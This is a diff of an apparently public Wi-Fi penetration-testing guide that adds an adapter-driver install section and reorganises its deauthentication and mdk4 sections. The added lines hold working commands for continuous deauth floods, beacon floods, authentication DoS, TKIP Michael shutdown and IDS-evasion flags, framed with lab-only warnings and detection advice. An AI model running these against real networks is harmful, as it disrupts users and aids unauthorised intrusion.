@@ -60,35 +60,36 @@ The rest of this guide walks each box in order, starting at [monitor mode](#moni
 **Setup**
 5. [What you need: adapter, monitor mode, Linux](#what-you-need)
 6. [Recommended adapters and where to buy](#recommended-adapters)
-7. [Install the tools](#install-the-tools)
-8. [The toolkit, tool by tool (and the aircrack-ng suite)](#toolkit)
+7. [External adapter not showing up? Install the driver](#adapter-drivers)
+8. [Install the tools](#install-the-tools)
+9. [The toolkit, tool by tool (and the aircrack-ng suite)](#toolkit)
 
 **The workflow**
-9. [Monitor mode, step by step](#monitor-mode)
-10. [Recon: scan for networks and clients](#recon)
-11. [Working on 5 GHz and the higher bands](#five-ghz)
-12. [Lock onto one target](#lock-onto-one-target)
-13. [Capture the WPA/WPA2 handshake](#capture-the-handshake)
-14. [Crack it: aircrack-ng, Hashcat, John](#crack-it)
-15. [WPS attacks: wash, reaver, bully](#wps-attacks)
-16. [The evil twin](#the-evil-twin)
-17. [Automate it: wifite and airgeddon](#automate-it)
-18. [Deauth and denial of service](#deauth-and-denial-of-service)
-19. [mdk4: beacon flood, auth DoS, and stress testing](#mdk4)
-20. [Fake authentication and ARP replay (WEP)](#fake-auth)
-21. [WPA2-Enterprise / 802.1X testing](#wpa2-enterprise)
+10. [Monitor mode, step by step](#monitor-mode)
+11. [Recon: scan for networks and clients](#recon)
+12. [Working on 5 GHz and the higher bands](#five-ghz)
+13. [Lock onto one target](#lock-onto-one-target)
+14. [Capture the WPA/WPA2 handshake](#capture-the-handshake)
+15. [Deauth and denial of service](#deauth-and-denial-of-service)
+16. [When aireplay-ng is weak: mdk4](#mdk4)
+17. [Crack it: aircrack-ng, Hashcat, John](#crack-it)
+18. [WPS attacks: wash, reaver, bully](#wps-attacks)
+19. [The evil twin](#the-evil-twin)
+20. [Automate it: wifite and airgeddon](#automate-it)
+21. [Fake authentication and ARP replay (WEP)](#fake-auth)
+22. [WPA2-Enterprise / 802.1X testing](#wpa2-enterprise)
 
 **Defence and reporting**
-22. [How the blue team detects it](#how-the-blue-team-detects-it)
-23. [Hardening and defence](#hardening-and-defence)
-24. [Troubleshooting](#troubleshooting)
-25. [Choosing the right attack](#choosing-the-right-attack)
-26. [Where IoT fits in](#where-iot-fits-in)
-27. [Wireless pentest checklist](#checklist)
-28. [Common ports reference](#ports)
-29. [Professional reporting](#reporting)
-30. [References and further learning](#references)
-31. [Legal and ethics](#legal-and-ethics)
+23. [How the blue team detects it](#how-the-blue-team-detects-it)
+24. [Hardening and defence](#hardening-and-defence)
+25. [Troubleshooting](#troubleshooting)
+26. [Choosing the right attack](#choosing-the-right-attack)
+27. [Where IoT fits in](#where-iot-fits-in)
+28. [Wireless pentest checklist](#checklist)
+29. [Common ports reference](#ports)
+30. [Professional reporting](#reporting)
+31. [References and further learning](#references)
+32. [Legal and ethics](#legal-and-ethics)
 
 ---
 
@@ -232,54 +233,64 @@ The chipset is everything. These are the chipsets with solid monitor mode and in
 
 > One I would **skip**: the TP-Link Archer T3U Plus (RTL8812BU). The 8812BU needs an out-of-tree driver and injection is unreliable. Save yourself the pain and get an Alfa.
 
+## External adapter not showing up? Install the driver
+<a id="adapter-drivers"></a>
+
+**Parrot vs Kali.** On **Parrot OS** most of these adapter drivers ship preinstalled, so a good external adapter often just works. On **Kali** they usually do **not**: plug in a dual-band Realtek adapter and if no `wlanX` appears, you need to build its driver. That, not a broken adapter, is almost always why an external adapter "does not show up".
+
+**Step 1: plug it in and identify it.**
+
+```bash
+lsusb                  # list USB devices; find your adapter and read its chipset
+iwconfig               # does a wlanX interface appear? if not, you need a driver
+sudo dmesg | tail -20  # right after plugging in, shows what the kernel tried to load
+```
+
+**Step 2: match the chipset to a driver.** These are the aircrack-ng forks, which have the best monitor-mode and injection support:
+
+| Chipset (from `lsusb`) | Driver repo |
+| --- | --- |
+| Realtek **8812au / 8821au** (Alfa AWUS036ACH and many dual-band cards) | [rtl8812au](https://github.com/aircrack-ng/rtl8812au) |
+| Realtek **8814au** (high-power dual-band) | [rtl8814au](https://github.com/aircrack-ng/rtl8814au) |
+| Realtek **8188eus / 8188eu** | [rtl8188eus](https://github.com/aircrack-ng/rtl8188eus) |
+| Atheros **AR9271**, MediaTek **MT7612U** | in-kernel, no build needed |
+
+**Step 3a: install with the script (easiest).** `Documents/driver-setup.sh` is interactive: option 1 identifies your adapter and the driver bound to it, and options 2 to 4 build the driver you pick from the repos above via DKMS (so it survives kernel updates).
+
+```bash
+git clone https://gitlab.com/deathesther/wifi-hacking-guide
+cd wifi-hacking-guide
+chmod +x Documents/driver-setup.sh
+sudo ./Documents/driver-setup.sh
+```
+
+**Step 3b: or build by hand.** Install the prerequisites, clone the matching repo, and DKMS-install. Example for the most common chipset (8812au):
+
+```bash
+sudo apt install -y git dkms build-essential libelf-dev linux-headers-$(uname -r)
+git clone --depth 1 https://github.com/aircrack-ng/rtl8812au.git
+cd rtl8812au
+sudo make dkms_install          # registers with DKMS so it survives kernel updates
+```
+
+The **rtl8814au** and **rtl8188eus** repos install exactly the same way (`git clone`, `cd`, `sudo make dkms_install`). After any build, **unplug and replug the adapter** (or reboot) so the new driver loads, then confirm with `lsusb` and `iwconfig`.
+
 ## Install the tools
 <a id="install-the-tools"></a>
 
-On Kali most of this is already present. To be sure:
+With the adapter working, install the toolkit. On Kali most of it is already present:
 
 ```bash
 sudo apt update
 sudo apt install aircrack-ng hashcat hcxdumptool hcxtools wifite reaver bully hostapd dnsmasq mdk4 macchanger -y
 ```
 
-### Option A: the setup script
-
-`Documents/install.sh` installs the toolkit above and optionally builds the two common out-of-tree Realtek drivers via DKMS. It is safe to re-run and does not reboot your machine.
+`Documents/install.sh` runs this same install in one go, and can also build the drivers from the [previous section](#adapter-drivers). It is safe to re-run and does not reboot your machine.
 
 ```bash
-git clone https://gitlab.com/deathesther/wifi-hacking-guide
-cd wifi-hacking-guide
 chmod +x Documents/install.sh
 sudo ./Documents/install.sh
 ```
-
-It installs `build-essential`, `dkms`, and the headers for your running kernel, then asks (y/N) whether to build each driver.
-
-### Option B: build a Realtek driver by hand
-
-If your dual-band adapter's chipset is not supported out of the box, build its driver. These are the two you will meet most often. Install the build prerequisites first:
-
-```bash
-sudo apt install -y git dkms build-essential libelf-dev linux-headers-$(uname -r)
-```
-
-**RTL8812AU / 8821AU / 8814AU** (Alfa AWUS036ACH and many dual-band cards):
-
-```bash
-git clone --depth 1 https://github.com/aircrack-ng/rtl8812au.git
-cd rtl8812au
-sudo make dkms_install          # registers with DKMS so it survives kernel updates
-```
-
-**RTL8188FU** (TP-Link TL-WN725N v3 and similar):
-
-```bash
-git clone --depth 1 https://github.com/kelebek333/rtl8188fu.git
-cd rtl8188fu
-sudo ./dkms-install.sh
-```
-
-After either build, **unplug and replug the adapter** (or reboot) so the new driver loads, then confirm it with `lsusb` and `iwconfig`. The in-kernel chipsets in the [adapter table](#recommended-adapters) (Atheros AR9271, MediaTek MT7612U) need none of this.
 
 ## The toolkit, tool by tool
 <a id="toolkit"></a>
@@ -379,17 +390,17 @@ iwconfig
 
 It will say `Mode:Managed`. Two ways to flip it to monitor.
 
-### The manual way (good to understand once)
+### The manual way with iw / ifconfig (good to understand once)
 
 ```bash
-sudo airmon-ng check kill      # stop NetworkManager and wpa_supplicant so they stop fighting you (this drops your WiFi, do not panic)
+sudo airmon-ng check kill           # stop NetworkManager and wpa_supplicant so they stop fighting you (this drops your WiFi, do not panic)
 sudo ifconfig wlan0 down
-sudo iwconfig wlan0 mode monitor
+sudo iw wlan0 set monitor control   # modern way (iw). Older equivalent: sudo iwconfig wlan0 mode monitor
 sudo ifconfig wlan0 up
-iwconfig                       # confirm it now says Mode:Monitor
+iwconfig                            # confirm it now says Mode:Monitor
 ```
 
-### The fast way
+### The fast way (automated, aircrack-ng suite)
 
 ```bash
 sudo airmon-ng check kill
@@ -446,18 +457,11 @@ By default airodump only scans 2.4GHz. To sweep 2.4GHz and 5GHz together, add `-
 sudo airodump-ng wlan0mon --band abg
 ```
 
-Example output:
+Example output (illustrative, synthetic data):
 
-```
- CH  6 ][ Elapsed: 0 mins ][ 2026-07-10 10:15
- BSSID              PWR  Beacons  #Data  CH  MB   ENC   CIPHER  AUTH  ESSID
- 3C:84:6A:11:22:33  -39       42      8   1  300  WPA2  CCMP    PSK   HomeWiFi
- 8A:BC:DE:44:55:66  -58       27      3   6  130  WPA2  CCMP    PSK   CoffeeShop
- F0:9F:C2:77:88:99  -69       18      0  11  130  OPN           --    Office-Guest
-
- BSSID              STATION             PWR   Rate    Lost  Frames
- 3C:84:6A:11:22:33  54:EF:44:AA:BB:CC   -45   54e-54     0      16
-```
+<div align="center">
+  <img src="assets/airodump-scan.png" alt="Illustrative airodump-ng scan showing APs with BSSID, power, channel, encryption, and the connected client stations" width="900">
+</div>
 
 What the columns mean:
 
@@ -556,19 +560,11 @@ sudo aireplay-ng --deauth 10 -a 3C:84:6A:11:22:33 -c 54:EF:44:AA:BB:CC wlan0mon
 - `-c` the client to bump (leave it off to hit all clients, but targeting one is cleaner and quieter)
 - `--deauth 10` send ten frames, then stop. This is a nudge to force a reconnect, not a flood.
 
-```
-18:42:15  Waiting for beacon frame (BSSID: 3C:84:6A:11:22:33)
-Sending 64 directed DeAuth frames
-18:42:19  Done.
-```
+<div align="center">
+  <img src="assets/aireplay-deauth.png" alt="Illustrative aireplay-ng deauth output in one tab and airodump-ng showing the captured WPA handshake banner in the other" width="900">
+</div>
 
-When the client reconnects, airodump catches the handshake and prints it in the top right:
-
-```
- CH 11 ][ WPA handshake: 3C:84:6A:11:22:33 ]
-```
-
-That is the whole job on site. The `.cap` file now holds the hash. Cracking happens offline, away from the target.
+When the client reconnects, airodump catches the handshake and prints `WPA handshake: <BSSID>` in the top right (the green banner above). That is the whole job on site. The `.cap` file now holds the hash. Cracking happens offline, away from the target.
 
 ### PMKID (often no deauth needed)
 
@@ -586,6 +582,151 @@ Start capturing (press CTRL+C to stop) ...
 Summary:
   PMKIDs: 1
 ```
+
+## Deauth and denial of service
+<a id="deauth-and-denial-of-service"></a>
+
+The bounded deauth above is the capture step. The same frame, understood fully: a deauthentication frame tells a client it has been disconnected. Deauth frames are a normal, required part of 802.11, and before WPA3 they are unprotected, so any device that has seen the AP and client addresses can forge one.
+
+```mermaid
+sequenceDiagram
+    participant AT as Attacker (monitor mode)
+    participant C as Client
+    participant AP as Access point
+    Note over AT: Has seen AP BSSID and client MAC from recon
+    AT->>C: Forged deauth (spoofed as from the AP)
+    Note over C: Believes the AP dropped it
+    C--xAP: Disconnects
+    C->>AP: Reassociates (four-way handshake)
+    Note over AT: A short burst captures the handshake.<br/>Sent continuously, the same frame is a denial of service.
+    Note over AP: With 802.11w / PMF on, the forged deauth is ignored and nothing happens
+```
+
+Used in short, targeted bursts to force a reconnect, deauth is a legitimate capture step. Sent **continuously**, the same frame becomes a **denial-of-service attack**: it keeps a network or a client offline for as long as it runs.
+
+> **Lab only, and here is why.** The commands below will knock real devices off a real network. Run them only against an AP **you own** or that is **explicitly in scope**, in a lab or an isolated test SSID. Sustained jamming is specifically illegal (see the [legal section](#legal-and-ethics)), and it is almost never in scope on a real engagement, because taking a client offline during business hours is exactly what they pay you not to do. The value of knowing these is the **detection** half in [how the blue team detects it](#how-the-blue-team-detects-it): you run it briefly in a lab to generate the signature, then prove the blue team can see it.
+
+**Continuous deauth with aireplay-ng (freezing a lab client).** Drop the count to `0` and aireplay-ng sends until you stop it with Ctrl+C. Omit `-c` to hit every client on the AP.
+
+```bash
+sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 wlan0mon          # all clients, until Ctrl+C
+sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 -c 54:EF:44:AA:BB:CC wlan0mon   # one client
+```
+
+Reference: the official [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) covers every mode (deauth, fakeauth, arpreplay, test).
+
+## When aireplay-ng is weak: mdk4
+<a id="mdk4"></a>
+
+If aireplay-ng injection is unreliable on your adapter, or you need to hit more than one target, **mdk4** is the heavier alternative. Where aireplay-ng injects specific single frames, mdk4 is the all-round 802.11 stress tool: successor to mdk3, ships in Kali, ten attack modes. It needs a card already in [monitor mode](#monitor-mode).
+
+<div align="center">
+  <img src="assets/mdk4-lab.png" alt="Illustrative mdk4 output: deauth flood (mode d) and beacon flood (mode b), lab only" width="900">
+</div>
+
+**aireplay-ng vs mdk4, when to use which:**
+
+| | `aireplay-ng` | `mdk4` |
+| --- | --- | --- |
+| Design | Precise, single-frame injection | Broad, high-volume stress tool |
+| Deauth | Targeted, bounded (`--deauth 10`) to capture a handshake | Flood mode (`d`), sustained, from a list |
+| Breadth | Deauth, fakeauth, arpreplay, injection test | Ten modes: beacon flood, auth DoS, probe, deauth, EAPOL, TKIP, mesh, WIDS confusion, fuzzer, PoC |
+| Typical use | The capture step (reconnect nudge), WEP replay | Generating a loud signature to prove the blue team can detect it |
+| Blast radius | Low when scoped to one client | High: easy to disrupt more than you intended |
+| Defeated by PMF | Yes (forged deauth ignored) | Yes for the management-frame modes (`a`, `d`, `e`) |
+
+> **Lab only.** Every command here disrupts a real network. Run them only against an AP you own or that is explicitly in scope, briefly, to generate a signature you then detect. See the [lab-only warning above](#deauth-and-denial-of-service) and the [legal section](#legal-and-ethics).
+
+```bash
+mdk4 --fullhelp                           # list every mode and option
+mdk4 --help d                             # help for one mode (here, deauth)
+```
+
+### Deauth with mdk4 (mode d)
+
+Mode `d` sends deauth and disassociation frames based on the data traffic it sees.
+
+```bash
+# Deauth EVERY client/AP it sees on a channel (channel 1 here)
+sudo mdk4 wlan0mon d -c 1
+
+# Deauth ONLY specific APs: list their BSSIDs in a file, one per line
+echo 3C:84:6A:11:22:33 > targets.txt
+sudo mdk4 wlan0mon d -b targets.txt -c 1
+
+# Whitelist: deauth everyone EXCEPT the clients/APs you list (protect known-good)
+sudo mdk4 wlan0mon d -w allowlist.txt -c 1
+```
+
+For a **single specific client**, mdk4's mode `d` works at AP/channel scope, so the surgical tool is still aireplay-ng with `-c`:
+
+```bash
+sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 -c 54:EF:44:AA:BB:CC wlan0mon
+```
+
+### Beacon flood with mdk4 (mode b)
+
+Mode `b` spams fake APs. It fills every scanner and floods a Wireshark capture with junk beacons.
+
+```bash
+# Random fake SSIDs (no name given = randomly generated)
+sudo mdk4 wlan0mon b
+
+# Fake SSIDs from a wordlist / file (one name per line)
+sudo mdk4 wlan0mon b -f ssids.txt
+
+# One specific fake SSID
+sudo mdk4 wlan0mon b -n FakeCorp
+
+# Add -s to cap the rate, for a controlled, readable lab signature
+sudo mdk4 wlan0mon b -f ssids.txt -s 100
+```
+
+### Freeze a network with mdk4
+
+```bash
+# Authentication DoS (mode a): flood an AP with fake auths until its
+# client table is exhausted and it freezes or resets
+sudo mdk4 wlan0mon a -a 3C:84:6A:11:22:33
+
+# Michael shutdown (mode m): LEGACY TKIP APs only. Provokes the Michael
+# countermeasure so the AP shuts down for ~60 seconds
+sudo mdk4 wlan0mon m -t 3C:84:6A:11:22:33
+```
+
+### Why beacon flood "confuses Wireshark"
+
+A beacon flood makes a scanner show hundreds of APs that do not exist, and a live capture fills with thousands of beacon frames a second. To cut back to real traffic while studying a flood, filter beacons in Wireshark:
+
+```
+wlan.fc.type_subtype == 0x08       # show only beacons (study the flood)
+!(wlan.fc.type_subtype == 0x08)    # hide beacons (keep reading real traffic)
+```
+
+### All ten modes, and what each one looks like to a defender
+
+| Mode | Attack | What a defender sees |
+| --- | --- | --- |
+| `b` | Beacon flooding | Dozens/hundreds of new SSIDs appear at once |
+| `a` | Authentication DoS | Flood of auth frames (subtype `0x0b`); AP may freeze/reset |
+| `p` | SSID probe / bruteforce | Burst of probe requests for one BSSID |
+| `d` | Deauth / disassociation | Deauth (12) / disassoc (10) storm, clients flapping |
+| `m` | Michael (TKIP) shutdown | TKIP AP shuts down ~60s (legacy networks only) |
+| `e` | EAPOL start/logoff flood | Flood of EAPOL-Start frames |
+| `s` | 802.11s mesh attacks | Abnormal mesh link-management traffic |
+| `w` | WIDS confusion | Contradictory association state across APs |
+| `f` | Packet fuzzer | Malformed / non-compliant frames |
+| `x` | Protocol-implementation PoC | Odd frames; target may crash or disconnect |
+
+A few notes that matter on a real test:
+
+- **`m` (Michael)** only bites legacy **TKIP** networks; modern WPA2-CCMP/WPA3 are immune, which is itself a finding ("you are still on TKIP").
+- **`w` (WIDS confusion)** deliberately feeds a wireless IDS contradictory data to see if it can be blinded, so it is useful specifically for exercising the blue team.
+- **`f` (fuzzer)** and **`x` (protocol PoC)** can crash drivers or firmware; report any device that crashes, that is a vendor bug.
+
+**IDS evasion.** mdk4 can append `--ghost <period,max_rate,min_txpower>` (switch rate/power periodically) and `--frag <min,max,percent>` (fragment outgoing frames) to dodge some signature-based IDS. They are driver-dependent and unreliable. The lesson for a defender: signature evasion is possible, so lean on **behavioural** detection (clients flapping, association-table churn, EAPOL rate) and on **802.11w / PMF**, which ignores the forged-management-frame modes (`a`, `d`, `e`) no matter how they are dressed up.
+
+A deauth or beacon flood is loud and obvious, and a blue team should catch it instantly. That is covered in [how the blue team detects it](#how-the-blue-team-detects-it). With a handshake captured, the next step is to crack it offline.
 
 ## Crack it
 <a id="crack-it"></a>
@@ -734,113 +875,6 @@ sudo airgeddon
 ```
 
 Use these to move fast, but only after you can do it by hand. An automated tool that you cannot debug is useless the moment it misbehaves on a real network.
-
-## Deauth and denial of service
-<a id="deauth-and-denial-of-service"></a>
-
-A deauthentication frame tells a client it has been disconnected. Deauth frames are a normal, required part of 802.11, and before WPA3 they are unprotected, so any device that has seen the AP and client addresses can forge one.
-
-```mermaid
-sequenceDiagram
-    participant AT as Attacker (monitor mode)
-    participant C as Client
-    participant AP as Access point
-    Note over AT: Has seen AP BSSID and client MAC from recon
-    AT->>C: Forged deauth (spoofed as from the AP)
-    Note over C: Believes the AP dropped it
-    C--xAP: Disconnects
-    C->>AP: Reassociates (four-way handshake)
-    Note over AT: A short burst captures the handshake.<br/>Sent continuously, the same frame is a denial of service.
-    Note over AP: With 802.11w / PMF on, the forged deauth is ignored and nothing happens
-```
-
-Used in short, targeted bursts to force a reconnect, deauth is a legitimate capture step, and that is covered above. Sent **continuously**, the same frame becomes a **denial-of-service attack**: it keeps a network or a client offline for as long as it runs.
-
-> **Lab only, and here is why.** The commands below will knock real devices off a real network. Run them only against an AP **you own** or that is **explicitly in scope**, in a lab or an isolated test SSID. Sustained jamming is specifically illegal (see the [legal section](#legal-and-ethics)), and it is almost never in scope on a real engagement, because taking a client offline during business hours is exactly what they pay you not to do. The value of knowing these is the **detection** half in the [next section](#how-the-blue-team-detects-it): you run it briefly in a lab to generate the signature, then prove the blue team can see it.
-
-**Continuous deauth with aireplay-ng (freezing a lab client).** Drop the count to `0` and aireplay-ng sends until you stop it with Ctrl+C. Omit `-c` to hit every client on the AP.
-
-```bash
-sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 wlan0mon          # all clients, until Ctrl+C
-sudo aireplay-ng --deauth 0 -a 3C:84:6A:11:22:33 -c 54:EF:44:AA:BB:CC wlan0mon   # one client
-```
-
-Reference: the official [aireplay-ng documentation](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) covers every mode (deauth, fakeauth, arpreplay, test). For the broader stress-testing tool, see the dedicated [mdk4 section](#mdk4) next.
-
-## mdk4: beacon flood, auth DoS, and stress testing
-<a id="mdk4"></a>
-
-Where aireplay-ng does one thing (inject specific frames), **mdk4** is the all-round 802.11 stress tool. It is the successor to mdk3, ships in Kali, and exposes ten attack modes. It needs a card already in [monitor mode](#monitor-mode).
-
-**aireplay-ng vs mdk4, when to use which:**
-
-| | `aireplay-ng` | `mdk4` |
-| --- | --- | --- |
-| Design | Precise, single-frame injection | Broad, high-volume stress tool |
-| Deauth | Targeted, bounded (`--deauth 10`) to capture a handshake | Flood mode (`d`), sustained, from a blacklist |
-| Breadth | Deauth, fakeauth, arpreplay, injection test | Ten modes: beacon flood, auth DoS, probe, deauth, EAPOL, TKIP, mesh, WIDS confusion, fuzzer, PoC |
-| Typical use | The capture step (reconnect nudge), WEP replay | Generating a loud signature to prove the blue team can detect it |
-| Blast radius | Low when scoped to one client | High: easy to disrupt more than you intended |
-| Defeated by PMF | Yes (forged deauth ignored) | Yes for the management-frame modes (`a`, `d`, `e`) |
-
-The short version: reach for **aireplay-ng** when you want one thing to happen to one client, and for **mdk4** only when the goal is a detection exercise in a lab you control. For the capture step, aireplay-ng's bounded deauth is almost always the right tool.
-
-> **Lab only.** Every command here disrupts a real network. Run them only against an AP you own or that is explicitly in scope, briefly, to generate a signature you then detect. See the [lab-only warning above](#deauth-and-denial-of-service) and the [legal section](#legal-and-ethics).
-
-```bash
-mdk4 --fullhelp                           # list every mode and option
-```
-
-### Demo: the three you will actually use
-
-```bash
-# 1. Beacon flood (mode b) - spam fake APs. Fills every scanner, and floods a
-#    Wireshark capture with junk beacons so real traffic is hard to read.
-sudo mdk4 wlan0mon b -n FakeCorp          # one fake SSID
-sudo mdk4 wlan0mon b -f ssids.txt         # a whole list of fake SSIDs from a file
-
-# 2. Authentication DoS (mode a) - flood an AP with fake auth frames.
-#    Enough fake clients can exhaust its table and freeze or reset it.
-sudo mdk4 wlan0mon a -a 3C:84:6A:11:22:33
-
-# 3. Deauth flood (mode d) - the continuous version of the handshake nudge,
-#    knocks listed BSSIDs offline and keeps them there.
-sudo mdk4 wlan0mon d -b blacklist.txt -c 6
-```
-
-### Why beacon flood "confuses Wireshark"
-
-A beacon flood makes a scanner show hundreds of APs that do not exist, and a live capture fills with thousands of beacon frames a second. To cut back to real traffic while studying a flood, filter beacons **out** in Wireshark:
-
-```
-wlan.fc.type_subtype == 0x08       # show only beacons (study the flood)
-!(wlan.fc.type_subtype == 0x08)    # hide beacons (keep reading real traffic)
-```
-
-### All ten modes, and what each one looks like to a defender
-
-| Mode | Attack | What a defender sees |
-| --- | --- | --- |
-| `b` | Beacon flooding | Dozens/hundreds of new SSIDs appear at once |
-| `a` | Authentication DoS | Flood of auth frames (subtype `0x0b`); AP may freeze/reset |
-| `p` | SSID probe / bruteforce | Burst of probe requests for one BSSID |
-| `d` | Deauth / disassociation | Deauth (12) / disassoc (10) storm, clients flapping |
-| `m` | Michael (TKIP) shutdown | TKIP AP shuts down ~60s (legacy networks only) |
-| `e` | EAPOL start/logoff flood | Flood of EAPOL-Start frames |
-| `s` | 802.11s mesh attacks | Abnormal mesh link-management traffic |
-| `w` | WIDS confusion | Contradictory association state across APs |
-| `f` | Packet fuzzer | Malformed / non-compliant frames |
-| `x` | Protocol-implementation PoC | Odd frames; target may crash or disconnect |
-
-A few notes that matter on a real test:
-
-- **`m` (Michael)** only bites legacy **TKIP** networks; modern WPA2-CCMP/WPA3 are immune, which is itself a finding ("you are still on TKIP").
-- **`w` (WIDS confusion)** deliberately feeds a wireless IDS contradictory data to see if it can be blinded, so it is useful specifically for exercising the blue team.
-- **`f` (fuzzer)** and **`x` (protocol PoC)** can crash drivers or firmware; report any device that crashes, that is a vendor bug.
-
-**IDS evasion.** mdk4 can append `--ghost <period,max_rate,min_txpower>` (switch rate/power periodically) and `--frag <min,max,percent>` (fragment outgoing frames) to dodge some signature-based IDS. They are driver-dependent and unreliable. The lesson for a defender: signature evasion is possible, so lean on **behavioural** detection (clients flapping, association-table churn, EAPOL rate) and on **802.11w / PMF**, which ignores the forged-management-frame modes (`a`, `d`, `e`) no matter how they are dressed up.
-
-What matters for a portfolio and for a defender is the other half: a deauth or beacon flood is loud and obvious, and a blue team should catch it instantly. That is covered in [how the blue team detects it](#how-the-blue-team-detects-it).
 
 ## Fake authentication and ARP replay (WEP)
 <a id="fake-auth"></a>
